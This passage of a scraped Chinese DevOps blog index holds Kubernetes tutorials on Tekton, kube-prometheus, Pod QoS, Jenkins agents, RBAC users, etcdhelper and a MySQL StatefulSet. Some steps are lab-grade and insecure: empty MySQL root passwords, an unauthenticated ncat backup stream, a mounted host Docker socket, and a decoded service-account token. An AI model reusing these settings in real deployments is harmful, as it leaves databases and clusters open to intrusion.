#!/usr/bin/env bash ts=`date \"+%Y%m%d-%H%M%S\"` echo \"Current Timestamp: ${ts}\" echo ${ts} | tr -d \"\\n\" | tee $(results.timestamp.path) - name: get-buildid image: docker.io/library/bash:5.0.18@sha256:8ef3f8518f47caf1ddcbdf49e983a9a119f9faeb41c2468dd20ff39cd242d69d #tag: 5.0.18 script: | #!/usr/bin/env bash ts=`cat $(results.timestamp.path)` buildId=$(inputs.params.base-version)-${ts} echo ${buildId} | tr -d \"\\n\" | tee $(results.build-id.path) 这个task会运行两个step,首先运行get-timestamp，并将结果写入到文件中，路径是$(results.timestamp.path),这个变量的最终结果其实就是一个文件路径/tekton/results/timestamp,第二个步骤也可以通过相同的路径访问这个文件,这样就实现了结果的传递。在pipeline中可以通过tasks.\u003ctaskName\u003e.results.\u003cresultName\u003e来调用不同task的结果,这就是它的作用了。我们也可以通过查看TaskRun的状态来获取运行结果。下面创建TaskRun试试看。 TaskRun apiVersion: tekton.dev/v1beta1 kind: TaskRun metadata: generateName: build-id- spec: taskRef: name: generate-build-id params: - name: base-version value: v1.0 运行后通过如下命令查看结果 k get taskrun build-id-m9q4t -o jsonpath={.status.taskResults} | jq . 92353-e6wemti92tt.png ","date":"2021-08-19 22:21","objectID":"/post/2627/:4:3","tags":["devops","tekton"],"title":"tekton学习-task资源对象(二)","uri":"/post/2627/"},{"categories":["kubernetes","devops"],"content":"四、示例 https://hub.tekton.dev 这里可以看到很多可以复用的tekton资源 ","date":"2021-08-19 22:21","objectID":"/post/2627/:5:0","tags":["devops","tekton"],"title":"tekton学习-task资源对象(二)","uri":"/post/2627/"},{"categories":["kubernetes","devops"],"content":"1.dood方式构建镜像 apiVersion: tekton.dev/v1beta1 kind: Task metadata: name: docker-build-push spec: params: - name: dockerfileName type: string description: dockerfile文件名,作为docker build -f的参数 default: Dockerfile # 指定需要一个git输入资源、一个image输出资源,在这个task运行时必要要提供 resources: inputs: - name: code type: git outputs: - name: builtImage type: image steps: - name: docker-build image: docker:stable workingDir: \"/workspace/$(resources.inputs.code.name)\" args: [ \"build\", \"--no-cache\", \"--tag\", \"$(resources.outputs.builtImage.url)\", \"--file\", \"$(params.dockerfileName)\", \".\", ] volumeMounts: - name: docker-socket mountPath: /var/run/docker.sock - name: docker-push image: docker:stable args: [\"push\", \"$(resources.outputs.builtImage.url)\"] volumeMounts: - name: docker-socket mountPath: /var/run/docker.sock # 定义一个卷，用于挂载主机的docker socket文件 volumes: - name: docker-socket hostPath: path: /var/run/docker.sock type: Socket 上面可以根据从git仓库的内容进行构建镜像和推送镜像,但如果是私有镜像仓库,该如何进行认证操作呢。tekton提供了两种方式,在taskrun或者pipelinerun的时候可以配置serviceAccountName。具体方式可以参考这里 附带taskrun示例: apiVersion: tekton.dev/v1beta1 kind: TaskRun metadata: generateName: website-build- spec: serviceAccountName: aliyun-cr resources: inputs: - name: code resourceSpec: type: git params: - name: url value: https://github.com/soulchildwm/tekton-demo.git - name: revision value: python-website outputs: - name: builtImage resourceSpec: type: image params: - name: url value: registry.cn-shanghai.aliyuncs.com/soulchild/zero params: - name: dockerfileName value: ./Dockerfile taskRef: name: docker-build-push 这里为了方便直接把pipelineresource也写到了taskrun里 ","date":"2021-08-19 22:21","objectID":"/post/2627/:5:1","tags":["devops","tekton"],"title":"tekton学习-task资源对象(二)","uri":"/post/2627/"},{"categories":["监控","kubernetes"],"content":"一、下载编排文件 git clone https://github.com.cnpmjs.org/prometheus-operator/kube-prometheus.git cd kube-prometheus/manifests/ ","date":"2021-07-31 16:08","objectID":"/post/2613/:0:1","tags":["k8s","prometheus"],"title":"kube-prometheus安装部署(一)","uri":"/post/2613/"},{"categories":["监控","kubernetes"],"content":"二、部署operator crd k apply -f setup/ ","date":"2021-07-31 16:08","objectID":"/post/2613/:0:2","tags":["k8s","prometheus"],"title":"kube-prometheus安装部署(一)","uri":"/post/2613/"},{"categories":["监控","kubernetes"],"content":"三、部署prometheus k apply -f . 如果需要数据持久化,可以配置pvc,前提是集群有storage-class,修改prometheus-prometheus.yaml,在最后追加如下内容 storage: volumeClaimTemplate: spec: storageClassName: nfs-storage resources: requests: storage: 50Gi ","date":"2021-07-31 16:08","objectID":"/post/2613/:0:3","tags":["k8s","prometheus"],"title":"kube-prometheus安装部署(一)","uri":"/post/2613/"},{"categories":["监控","kubernetes"],"content":"四、解决报错 61451-s1tklrm78h9.png kube-state-metrics镜像拉取错误，k describe pod -n monitoring kube-state-metrics-76f6cb7996-2nqpf查看详细信息 31439-4w9umx1953p.png 需要访问google，em。。。我从本地拉了一个传到阿里云镜像仓库了,镜像地址: registry.cn-shanghai.aliyuncs.com/soulchild/kube-state-metrics:v2.0.0 修改镜像: k set image -n monitoring deployment kube-state-metrics kube-state-metrics=registry.cn-shanghai.aliyuncs.com/soulchild/kube-state-metrics:v2.0.0 部署完成 01998-qj8e0wb6xer.png ","date":"2021-07-31 16:08","objectID":"/post/2613/:0:4","tags":["k8s","prometheus"],"title":"kube-prometheus安装部署(一)","uri":"/post/2613/"},{"categories":["监控","kubernetes"],"content":"五、配置ingress提供外部访问 apiVersion: networking.k8s.io/v1 kind: Ingress metadata: name: prometheus namespace: monitoring spec: rules: - host: prom.ops.cn http: paths: - pathType: Prefix path: \"/\" backend: service: name: prometheus-k8s port: name: web - host: alert.ops.cn http: paths: - pathType: Prefix path: \"/\" backend: service: name: alertmanager-main port: name: web - host: grafana.ops.cn http: paths: - pathType: Prefix path: \"/\" backend: service: name: grafana port: name: http ","date":"2021-07-31 16:08","objectID":"/post/2613/:0:5","tags":["k8s","prometheus"],"title":"kube-prometheus安装部署(一)","uri":"/post/2613/"},{"categories":["监控","kubernetes"],"content":"六、解决controllerManager和scheduler不能自动发现 kube-prometheus默认会在kube-system命名空间下查找controllerManager和scheduler的service对应的endpoint作为target地址,由于我本地是二进制部署的集群,并没有这两个service和ep,所以需要手动创建一下 controller-manager: apiVersion: v1 kind: Service metadata: name: kube-controller-manager namespace: kube-system labels: app.kubernetes.io/name: kube-controller-manager spec: type: ClusterIP clusterIP: None ports: - name: https-metrics port: 10257 --- apiVersion: v1 kind: Endpoints metadata: name: kube-controller-manager namespace: kube-system labels: app.kubernetes.io/name: kube-controller-manager subsets: - addresses: - ip: 172.17.20.201 - ip: 172.17.20.202 - ip: 172.17.20.203 ports: - name: https-metrics port: 10257 protocol: TCP scheduler: apiVersion: v1 kind: Service metadata: name: kube-scheduler namespace: kube-system labels: app.kubernetes.io/name: kube-scheduler spec: type: ClusterIP clusterIP: None ports: - name: https-metrics port: 10259 --- apiVersion: v1 kind: Endpoints metadata: name: kube-scheduler namespace: kube-system labels: app.kubernetes.io/name: kube-scheduler subsets: - addresses: - ip: 172.17.20.201 - ip: 172.17.20.202 - ip: 172.17.20.203 ports: - name: https-metrics port: 10259 protocol: TCP ","date":"2021-07-31 16:08","objectID":"/post/2613/:0:6","tags":["k8s","prometheus"],"title":"kube-prometheus安装部署(一)","uri":"/post/2613/"},{"categories":["监控","kubernetes"],"content":"七、解决CoreDns不能自动发现 kube-prometheus同样通过service查找coredns的ep作为target,kube-prometheus在选择service的时候使用的是app.kubernetes.io/name: kube-dns这样的标签,但是我部署的core-dns没有这个标签，所以需要添加这个标签 k label service -n kube-system kube-dns app.kubernetes.io/name=kube-dns 可以看到刚才的几个组件都可以正常显示了 91045-yhbt1po8vz.png ","date":"2021-07-31 16:08","objectID":"/post/2613/:0:7","tags":["k8s","prometheus"],"title":"kube-prometheus安装部署(一)","uri":"/post/2613/"},{"categories":["监控","kubernetes"],"content":"八、访问测试 grafana的默认账号密码是admin 79123-1epig03h6vr.png ","date":"2021-07-31 16:08","objectID":"/post/2613/:0:8","tags":["k8s","prometheus"],"title":"kube-prometheus安装部署(一)","uri":"/post/2613/"},{"categories":["kubernetes"],"content":"官方文档: https://kubernetes.io/docs/tasks/configure-pod-container/quality-service-pod/ ","date":"2021-07-31 10:31","objectID":"/post/2611/:0:0","tags":["k8s"],"title":"k8s 中pod的QoS","uri":"/post/2611/"},{"categories":["kubernetes"],"content":"前言 在k8s中可以设置request和limit对Pod进行资源限制,不同的设置方法会影响这个Pod的QoS级别。 ","date":"2021-07-31 10:31","objectID":"/post/2611/:0:1","tags":["k8s"],"title":"k8s 中pod的QoS","uri":"/post/2611/"},{"categories":["kubernetes"],"content":"QoS级别分为三种: Guaranteed: Pod中的所有容器必须同时设置cpu和memory的request和limit，并且限制的值要相同。(还有一种情况是只设置了limit没有设置request,这种情况k8s会自动加上request的限制，所以这种情况也属于Guaranteed) Burstable: 不满足Guaranteed时,只要设置了request或者limit就是这种类型 BestEffort: 既没有设置request也没有设置limit ","date":"2021-07-31 10:31","objectID":"/post/2611/:0:2","tags":["k8s"],"title":"k8s 中pod的QoS","uri":"/post/2611/"},{"categories":["kubernetes"],"content":"三种类型的影响 当宿主机资源不足时,kubelet会对Pod进行驱逐(Eviction),驱逐的阈值在kubelet的evictionHard字段中配置。 哪些Pod会被优先驱逐就和QoS等级有关了,驱逐的顺序如下: BestEffort Burstable Guaranteed ","date":"2021-07-31 10:31","objectID":"/post/2611/:0:3","tags":["k8s"],"title":"k8s 中pod的QoS","uri":"/post/2611/"},{"categories":["kubernetes"],"content":"一、创建namespace k create namespace devops ","date":"2021-07-23 14:37","objectID":"/post/2591/:0:1","tags":["k8s","jenkins"],"title":"k8s 部署jenkins实现动态slave","uri":"/post/2591/"},{"categories":["kubernetes"],"content":"二、创建PVC 我的k8s集群已经配置过nfs-storageclass了,所以下面只创建了pvc，pv是自动创建的 apiVersion: v1 kind: PersistentVolumeClaim metadata: name: jenkins-pvc namespace: devops spec: storageClassName: nfs-storage accessModes: - ReadWriteOnce resources: requests: storage: 20Gi ","date":"2021-07-23 14:37","objectID":"/post/2591/:0:2","tags":["k8s","jenkins"],"title":"k8s 部署jenkins实现动态slave","uri":"/post/2591/"},{"categories":["kubernetes"],"content":"三、创建ServiceAccount --- apiVersion: v1 kind: ServiceAccount metadata: name: jenkins namespace: devops --- apiVersion: rbac.authorization.k8s.io/v1 kind: Role metadata: annotations: rbac.authorization.kubernetes.io/autoupdate: \"true\" labels: kubernetes.io/bootstrapping: rbac-defaults name: jenkins namespace: devops rules: - apiGroups: - \"\" resources: - pods - pods/log - pods/exec verbs: - create - get - watch - delete - list - patch - update - apiGroups: - \"\" resources: - secrets verbs: - get --- apiVersion: rbac.authorization.k8s.io/v1 kind: RoleBinding metadata: annotations: rbac.authorization.kubernetes.io/autoupdate: \"true\" labels: kubernetes.io/bootstrapping: rbac-defaults name: jenkins namespace: devops roleRef: apiGroup: rbac.authorization.k8s.io kind: Role name: jenkins subjects: - apiGroup: rbac.authorization.k8s.io kind: User # system:serviceaccounts:\u003cnamespace名称\u003e表示devops命名空间的所有ServiceAccount，这里用到了k8s中以用户组的概念，如果要使用这种方法，需要将kind的值改为Group #name: system:serviceaccounts:devops # 下面表达的意思是devops命名空间下的jenkins serviceaccount name: system:serviceaccount:devops:jenkins ","date":"2021-07-23 14:37","objectID":"/post/2591/:0:3","tags":["k8s","jenkins"],"title":"k8s 部署jenkins实现动态slave","uri":"/post/2591/"},{"categories":["kubernetes"],"content":"四、创建Deployment 关于jenkins镜像说明: https://github.com/jenkinsci/docker/blob/master/README.md 注意点: jenkins存储目录在/var/jenkins_home，所以需要持久化这个目录 端口有两个，一个是8080(web页面),另一个是50000(agent端口) JVM参数通过JAVA_OPTS环境变量修改 apiVersion: apps/v1 kind: Deployment metadata: name: jenkins namespace: devops spec: replicas: 1 selector: matchLabels: app: jenkins template: metadata: labels: app: jenkins spec: containers: - name: jenkins image: jenkins/jenkins:lts-jdk11 imagePullPolicy: IfNotPresent ports: - name: web containerPort: 8080 - name: tcp containerPort: 50000 volumeMounts: - name: jenkins-home mountPath: /var/jenkins_home startupProbe: httpGet: path: /login port: web initialDelaySeconds: 60 periodSeconds: 10 successThreshold: 1 failureThreshold: 10 timeoutSeconds: 5 readinessProbe: httpGet: path: /login port: web initialDelaySeconds: 60 periodSeconds: 2 successThreshold: 1 failureThreshold: 2 timeoutSeconds: 5 livenessProbe: httpGet: path: /login port: web initialDelaySeconds: 60 periodSeconds: 2 successThreshold: 1 failureThreshold: 2 timeoutSeconds: 5 volumes: - name: jenkins-home persistentVolumeClaim: claimName: jenkins-pvc ","date":"2021-07-23 14:37","objectID":"/post/2591/:0:4","tags":["k8s","jenkins"],"title":"k8s 部署jenkins实现动态slave","uri":"/post/2591/"},{"categories":["kubernetes"],"content":"五、创建Service 我在测试的时候jnlp容器报错:java.nio.channels.UnresolvedAddressException，查询资料发现jenkins-web的地址要和jenkins-agent的地址一样,所以web和agent要使用同一个service，但是我不想把jenkins-agent的端口暴露在集群外，所以下面我创建了两个service，一个是提供jenkins-web的外部访问(只包含web)，一个用于集群内部访问(包含web和agent) apiVersion: v1 kind: Service metadata: name: jenkins-web namespace: devops spec: type: NodePort ports: - name: web port: 8080 targetPort: 8080 selector: app: jenkins --- apiVersion: v1 kind: Service metadata: name: jenkins namespace: devops spec: type: ClusterIP ports: - name: web port: 8080 targetPort: 8080 - name: agent port: 50000 targetPort: 50000 selector: app: jenkins ","date":"2021-07-23 14:37","objectID":"/post/2591/:0:5","tags":["k8s","jenkins"],"title":"k8s 部署jenkins实现动态slave","uri":"/post/2591/"},{"categories":["kubernetes"],"content":"六、访问测试 查看nodeport端口 k get svc -n devops jenkins-web -o jsonpath={.spec.ports[*].nodePort} 31375-uocot4fdnh.png 查看初始密码 k logs -n devops --selector=app=jenkins --tail=100 |egrep '^([0-9]|[a-zA-Z]){32}' ","date":"2021-07-23 14:37","objectID":"/post/2591/:0:6","tags":["k8s","jenkins"],"title":"k8s 部署jenkins实现动态slave","uri":"/post/2591/"},{"categories":["kubernetes"],"content":"7、配置动态slave(请自行安装kubernetes插件) ** 1.查看jenkins serviceaccount token ** k get secret -n devops $(k get sa -n devops jenkins -o jsonpath={.secrets[0].name}) -o jsonpath={.data.token} |base64 -d ;echo ** 2.创建jenkins凭据 ** 22840-ngajm3rzzwj.png 65046-vg7a39pfnl.png ** 将第一步的token填入到secret即可 ** 79630-uzprr44r3a8.png ** 3.配置kubernetes插件 ** 41961-i2ldor2m4g.png 37873-z5k2ofaw81c.png 60773-z6gmpfbqjw.png 86260-g1ioxstsg29.png ** 连接测试后，显示Connected to kubernetes v1.xx.x即正常 ** 97210-3ngztdum8vc.png 28033-ixci6olfhk9.png 最后保存即可。 ** 4.配置Pod模板 ** 40796-686soldwlzq.png 66722-eowqak1olbf.png 这里只配置了最基本的内容,默认情况下kubernetes插件会包含一个jnlp的容器,用于连接到jenkins master,保存后进行一个简单的测试 ** 5.测试 ** 创建一个job 12280-iydbah0rend.png 42410-shiawppa6ub.png 构建过程中jenkins会在k8s中创建jenkins-slave-xx pod作为节点,并在这个节点中运行我们指定的命令 95982-ssnxl1r5cn.png 构建结果 79562-yr0morispgc.png ","date":"2021-07-23 14:37","objectID":"/post/2591/:0:7","tags":["k8s","jenkins"],"title":"k8s 部署jenkins实现动态slave","uri":"/post/2591/"},{"categories":["kubernetes"],"content":"前言 创建一个soulchild用户，让他可以访问default命名空间的pod和日志.创建用户证书使用的是cfssl工具 ","date":"2021-07-21 12:00","objectID":"/post/2585/:0:1","tags":["k8s"],"title":"k8s rbac创建一个User并赋予他指定的权限","uri":"/post/2585/"},{"categories":["kubernetes"],"content":"一、为用户生成证书 1.创建cfssl api请求内容 cat \u003e soulchild.json \u003c\u003cEOF { \"CN\": \"soulchild\", \"key\": { \"algo\": \"rsa\", \"size\": 2048 }, \"names\": [ { \"O\": \"ops\" } ] } EOF CN:代表用户名 O: 代表组名 2.生成证书 cfssl gencert -ca /etc/kubernetes/pki/ca/ca.pem -ca-key /etc/kubernetes/pki/ca/ca-key.pem -config /etc/kubernetes/pki/ca/ca-config.json -profile kubernetes soulchild.json | cfssljson -bare soulchild cfssl的配置可查看https://soulchild.cn/2462.html 3.生成证书后使用curl访问测试 curl -k https://master:6443/api/v1/namespaces/kube-system/pods --cert ./soulchild.pem --key ./soulchild-key.pem 17545-95zajvjudnd.png 可以看到提示soulchild用户不能在kube-system命名空间列出核心api组中的pods资源,因为我们没有配置权限,但是他已经可以识别到soulchild用户了,这是我们预期的结果。下面我们去配置权限 ","date":"2021-07-21 12:00","objectID":"/post/2585/:0:2","tags":["k8s"],"title":"k8s rbac创建一个User并赋予他指定的权限","uri":"/post/2585/"},{"categories":["kubernetes"],"content":"二、创建Role(角色) 创建一个在kube-system命名空间下只能执行list、get、watch操作的角色。 apiVersion: rbac.authorization.k8s.io/v1 kind: Role metadata: name: readonly-pod namespace: kube-system rules: - apiGroups: [\"\"] resources: [\"pods\", \"pods/log\"] resourceNames: [] verbs: - list - get - watch apiGroups: 要控制哪些api组的权限，““代表核心api组 verbs: 可以执行的操作权限,目前支持的选项包括[\"list\", \"get\", \"watch\", \"delete\", \"patch\", \"create\", \"update\" ] resources: verbs权限对哪种资源类型生效 resourceNames: 设置对哪个具体的资源生效,比如可以指定一个pod名称,代表只能查看这一个pod。空数组代表所有。设置这个的前提是必须对这个具体资源的资源类型有权限 ","date":"2021-07-21 12:00","objectID":"/post/2585/:0:3","tags":["k8s"],"title":"k8s rbac创建一个User并赋予他指定的权限","uri":"/post/2585/"},{"categories":["kubernetes"],"content":"三、创建RoleBinding 用户和权限都已经有了，现在我们需要将权限和用户关联起来 apiVersion: rbac.authorization.k8s.io/v1 kind: RoleBinding metadata: name: readonly-pod-binding namespace: kube-system subjects: - kind: User name: soulchild roleRef: kind: Role name: readonly-pod apiGroup: rbac.authorization.k8s.io subjects.kind: 用户类型，可以是User,Group,ServiceAccount subjects.name: 用户名称 roleRef.Role: 引用的资源类型,仅支持Role和ClusterRole选项.因为之前我们创建的是Role,所以这里配置的Role roleRef.name: 引用的资源名称,即Role或者ClusterRole的名称 roleRef.apiGroup: 引用的api组,即Role或者ClusterRole的api组 ","date":"2021-07-21 12:00","objectID":"/post/2585/:0:4","tags":["k8s"],"title":"k8s rbac创建一个User并赋予他指定的权限","uri":"/post/2585/"},{"categories":["kubernetes"],"content":"四、测试权限 # 获取kube-system命名空间下的所有pod名称 curl -k -s https://172.17.20.200:6443/api/v1/namespaces/kube-system/pods/ --cert ./soulchild.pem --key ./soulchild-key.pem | jq -c '.items[]?.metadata.name' 28590-xbayz0qsj8q.png ","date":"2021-07-21 12:00","objectID":"/post/2585/:0:5","tags":["k8s"],"title":"k8s rbac创建一个User并赋予他指定的权限","uri":"/post/2585/"},{"categories":["kubernetes"],"content":"五、使用kubeconfig访问 # 设置用户凭证 k config set-credentials soulchild --client-certificate ./soulchild.pem --client-key ./soulchild-key.pem --embed-certs # 设置上下文 k config set-context soulchild --cluster kubernetes --user soulchild --namespace kube-system # 访问测试 k get pod --context soulchild 这里留个备忘: 使用serviceaccount创建用户时，可以使用k config set-credentials soulchild –token=xxxxx添加用户 84825-3a5h4w52x66.png ","date":"2021-07-21 12:00","objectID":"/post/2585/:0:6","tags":["k8s"],"title":"k8s rbac创建一个User并赋予他指定的权限","uri":"/post/2585/"},{"categories":["kubernetes"],"content":"项目地址: https://github.com/openshift/origin k8s存在etcd中的数据是经过protobuf序列化的,直接查看会存在乱码的情况,使用etcdhelper可解决这个问题 ","date":"2021-07-20 14:42","objectID":"/post/2584/:0:0","tags":["k8s","etcd"],"title":"使用etcdhelper查询etcd中k8s的资源数据","uri":"/post/2584/"},{"categories":["kubernetes"],"content":"一、编译安装 # 拉取代码 git clone --depth 1 https://github.com/openshift/origin.git # 跨平台编译二进制文件(我是mac系统,编译成linux可执行二进制文件) CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build tools/etcdhelper/etcdhelper.go # 如果你是windows,请使用以下命令 SET CGO_ENABLED=0 SET GOOS=linux SET GOARCH=amd64 go build tools/etcdhelper/etcdhelper.go # 将编译好的二进制程序放入系统环境变量可识别的地方 mv etcdhelper /usr/local/bin/ 这里有一个我已经编译好的: http://soulchild.cn/down/etcdhelper ","date":"2021-07-20 14:42","objectID":"/post/2584/:0:1","tags":["k8s","etcd"],"title":"使用etcdhelper查询etcd中k8s的资源数据","uri":"/post/2584/"},{"categories":["kubernetes"],"content":"二、使用 用alias起个别名,方便使用 # 这里endpoint不可以写多节点 echo 'alias etcdhelper=\"etcdhelper -endpoint https://172.17.20.201:2379 -cacert /etc/kubernetes/pki/ca/ca.pem -key /etc/kubernetes/pki/etcd/etcd-key.pem -cert /etc/kubernetes/pki/etcd/etcd.pem\"' \u003e\u003e ~/.bashrc source ~/.bashrc 使用方法: # 查看key列表 etcdhelper ls # 查看key的value etcdhelper get /registry/pods/default/my-pod ","date":"2021-07-20 14:42","objectID":"/post/2584/:0:2","tags":["k8s","etcd"],"title":"使用etcdhelper查询etcd中k8s的资源数据","uri":"/post/2584/"},{"categories":["kubernetes"],"content":"1、创建Pod流程 51776-nrhsb54bti.png 图片来源: heptio.com 客户端将创建Pod的请求发送给Apiserver Apiserver将Pod信息写入etcd,etcd将写入结果响应给Apiserver,Apiserver将创建结果响应给客户端(此时Pod处于Pending状态) Scheduler通过Apiserver的watch接口,获取到未调度的Pod的通知,根据调度算法选择一个node节点,告诉Apiserver这个Pod应该运行在哪个节点 Apiserver将这个Pod和node的绑定信息更新到etcd,etcd将写入结果响应给Apiserver Kubelet通过Apiserver的watch接口,获取到当前节点有创建Pod的通知,Kubelet调用docker创建容器,Kubelet将Pod运行状态发送给Apiserver Apiserver将Pod状态信息更新到etcd ","date":"2021-07-20 10:59","objectID":"/post/2579/:0:1","tags":["k8s"],"title":"k8s 创建pod和deployment的流程","uri":"/post/2579/"},{"categories":["kubernetes"],"content":"2、创建Deployment流程 26432-2orcxruqs6c.png 图片来源书籍: kubernetes in action 客户端将创建Deployment的请求发送给Apiserver Apiserver将Deployment信息写入etcd,etcd将写入结果响应给Apiserver,Apiserver将创建结果响应给客户端(此时未经过ControllerManager,deployment的READY状态为0) ControllerManager通过Apiserver的watch接口,获取到新增的Deployment资源,Deployment controller向Apiserver发送创建RS的请求,Apiserver将RS信息写入etcd。。。 ControllerManager通过Apiserver的watch接口,获取到新增的ReplicaSet资源,ReplicaSet controller向Apiserver发送创建Pod的请求,Apiserver将Pod信息写入etcd。。。 Scheduler通过Apiserver的watch接口,获取到未调度的Pod的通知,根据调度算法选择一个node节点,告诉Apiserver这个Pod应该运行在哪个节点 Apiserver将这个Pod和node的绑定信息更新到etcd,etcd将写入结果响应给Apiserver Kubelet通过Apiserver的watch接口,获取到当前节点有创建Pod的通知,Kubelet调用docker创建容器,Kubelet将Pod运行状态发送给Apiserver Apiserver将Pod状态信息更新到etcd 通过Apiserver的watch接口获取的信息，都是由Apiserver主动通知的 ","date":"2021-07-20 10:59","objectID":"/post/2579/:0:2","tags":["k8s"],"title":"k8s 创建pod和deployment的流程","uri":"/post/2579/"},{"categories":["kubernetes"],"content":"前言 原文档地址: https://kubernetes.io/zh/docs/tasks/run-application/run-replicated-stateful-application/ 使用本文档部署需要集群中提前配置好storage-class，或者手动创建pv，pvc ","date":"2021-07-19 14:21","objectID":"/post/2577/:0:1","tags":["mysql","k8s"],"title":"k8s 使用statefulset部署mysql主从","uri":"/post/2577/"},{"categories":["kubernetes"],"content":"1.创建configmap mysql配置文件 --- apiVersion: v1 kind: ConfigMap metadata: name: mysql labels: app: mysql data: master.cnf: | [mysqld] log-bin slave.cnf: | [mysqld] super-read-only ","date":"2021-07-19 14:21","objectID":"/post/2577/:0:2","tags":["mysql","k8s"],"title":"k8s 使用statefulset部署mysql主从","uri":"/post/2577/"},{"categories":["kubernetes"],"content":"2.创建svc --- apiVersion: v1 kind: Service metadata: name: mysql labels: app: mysql spec: ports: - name: mysql port: 3306 clusterIP: None selector: app: mysql --- apiVersion: v1 kind: Service metadata: name: mysql-read labels: app: mysql spec: ports: - name: mysql port: 3306 selector: app: mysql 一个headless service和一个普通service，headless用于statefulset,给每个pod提供一个固定的dns记录，普通service提供负载均衡 ","date":"2021-07-19 14:21","objectID":"/post/2577/:0:3","tags":["mysql","k8s"],"title":"k8s 使用statefulset部署mysql主从","uri":"/post/2577/"},{"categories":["kubernetes"],"content":"3.创建statefulset --- apiVersion: apps/v1 kind: StatefulSet metadata: name: mysql spec: selector: matchLabels: app: mysql # service-headless为每个pod提供一个固定的dns解析,eg:mysql-0.mysql,mysql-1.mysql serviceName: mysql replicas: 3 template: metadata: labels: app: mysql spec: initContainers: # 用于生成主从配置文件的容器 - name: init-mysql image: mysql:5.7 volumeMounts: - name: conf mountPath: /mnt/conf.d - name: config-map mountPath: /mnt/config-map command: - bash - \"-c\" - | set -ex # 使用正则匹配pod序号,结果会存在BASH_REMATCH变量中 [[ `hostname` =~ -([0-9]+)$ ]] || exit 1 # 获取序号 ordinal=${BASH_REMATCH[1]} # server-id=0有特出含义,因此给ID+100来避开它 serverid=$(($ordinal+100)) # 写入到配置文件中 echo -e \"[mysqld]\\nserver-id=$serverid\" \u003e /mnt/conf.d/server-id.cnf # 如果是主节点,将主节点配置文件复制到/mnt/conf.d,负责复制从节点 if [[ $ordinal == 0 ]];then cp /mnt/config-map/master.cnf /mnt/conf.d/ else cp /mnt/config-map/slave.cnf /mnt/conf.d/ fi # 用于从节点容器启动时复制数据 - name: clone-mysql image: registry.cn-shanghai.aliyuncs.com/soulchild/xtrabackup:2.4 volumeMounts: - name: mysql-data mountPath: /var/lib/mysql subPath: mysql command: - bash - -c - | set -ex # 复制数据操作只有在第一次没有数据的时候需要,所以判断数据存在则跳过 [[ -d /var/lib/mysql/mysql ]] \u0026\u0026 exit 0 # 正则匹配序号,匹配失败则异常退出 [[ `hostname` =~ -([0-9]+$) ]] || exit 1 # 获取序号 ordinal=${BASH_REMATCH[1]} # 主节点不需要复制操作 [[ $ordinal == 0 ]] \u0026\u0026 exit 0 # 使用ncat从前一个节点中复制数据,3307端口是我们启动的一个sidecar容器，他是使用ncat运行的一个服务,这个服务的具体操作可以看xtrabackup容器的配置 ncat --recv-only mysql-$((ordinal-1)).mysql 3307 | xbstream -x -C /var/lib/mysql # --prepare参数,在备份完成后，数据尚且不能用于恢复操作，因为备份的数据中可能会包含尚未提交的事务或已经提交但尚未同步至数据文件中的事务. xtrabackup --prepare --target-dir=/var/lib/mysql containers: - name: mysql image: mysql:5.7 ports: - name: mysql containerPort: 3306 env: - name: MYSQL_ALLOW_EMPTY_PASSWORD value: \"1\" volumeMounts: - name: mysql-data mountPath: /var/lib/mysql subPath: mysql - name: conf mountPath: /etc/mysql/conf.d resources: requests: memory: 1Gi cpu: 500m limits: memory: 1Gi cpu: 500m startupProbe: exec: command: [\"mysql\", \"-h\", \"127.0.0.1\", \"-e\", \"select 1\"] livenessProbe: exec: command: [\"mysqladmin\", \"ping\"] initialDelaySeconds: 10 periodSeconds: 10 timeoutSeconds: 5 readinessProbe: exec: command: [\"mysql\", \"-h\", \"127.0.0.1\", \"-e\", \"select 1\"] initialDelaySeconds: 10 periodSeconds: 5 timeoutSeconds: 2 - name: xtrabackup image: registry.cn-shanghai.aliyuncs.com/soulchild/xtrabackup:2.4 volumeMounts: - name: mysql-data mountPath: /var/lib/mysql subPath: mysql - name: conf mountPath: /etc/mysql/conf.d command: - bash - \"-c\" - | set -ex cd /var/lib/mysql # xtrabackup备份后会生成一个文件,有两种情况,xtrabackup_slave_info和xtrabackup_binlog_info if [[ -f xtrabackup_slave_info ]];then # xtrabackup_slave_info存在则表示这个备份来自一个从节点,文件包含change master to sql语句,将这个文件改为change_master_to.sql.in cat xtrabackup_slave_info | sed -E 's/;$//g' \u003e change_master_to.sql.in rm -f xtrabackup_slave_info elif [[ -f xtrabackup_binlog_info ]];then # 如果只存在xtrabackup_binlog_info文件则备份来自主节点,这个文件包含了bin-log文件名和position偏移量,需要我们自己解析成change master to sql # 使用正则解析获取binlog信息,并生成change master to sql [[ `cat xtrabackup_binlog_info` =~ ^(.*?)[[:space:]]+([0-9]+)$ ]] || exit 1 echo \"CHANGE MASTER TO MASTER_LOG_FILE='${BASH_REMATCH[1]}', MASTER_LOG_POS=${BASH_REMATCH[2]}\" \u003e change_master_to.sql.in # 删除xtrabackup_binlog_info,防止下一次没有经过备份时,重复生成change_master_to.sql.in rm -f xtrabackup_binlog_info fi # 判断initcontainer是否进行了备份,如果进行了备份会经过我们上面的逻辑生成change_master_to.sql.in,如果存在change_master_to.sql.in，则需要执行相应的sql if [[ -f change_master_to.sql.in ]];then # 等待mysql容器启动 echo 'Waiting for mysqld to be ready (accept connections)' until mysql -h 127.0.0.1 -e 'select 1';do sleep 1;done sleep 5 echo 'Initializing replication from clone position' # 执行change master sql sql=\"$(\u003cchange_master_to.sql.in), master_host='mysql-0.mysql', master_user='root', master_password='', master_connect_retry=10; start slave;\" mysql -h 127.0.0.1 -e \"$sql\" || exit 1 # 重命名change_master_to.sql.in文件，防止重复执行change master mv change_master_to.sql.in change_master_to.sql.in.orig fi # 使用ncat监听3307端口,在收到传输请求时会执行xtrabackup备份操作,然后传输数据给请求数据的节点 # 使用ex","date":"2021-07-19 14:21","objectID":"/post/2577/:0:4","tags":["mysql","k8s"],"title":"k8s 使用statefulset部署mysql主从","uri":"/post/2577/"},{"categories":["kubernetes"],"content":"4. statefulset配置说明 4.1 initContainer 下面介绍的是两个初始化容器配置，会在pod启动时优先启动的容器 1.init-mysql容器 该容器挂载了两个volume，分别是conf，config-map(在volumes中定义)。conf是pod中容器之间的共享卷(使用的emptyDir)，configmap是分别包含mysql主从的配置文件。conf挂载到/mnt/conf.d目录，configmap挂载到/mnt/config-map目录 这个容器在启动时会判断当前pod属否为master节点，这里的mysql-0指定为master节点，如果pod id是0则将id+100作为mysql 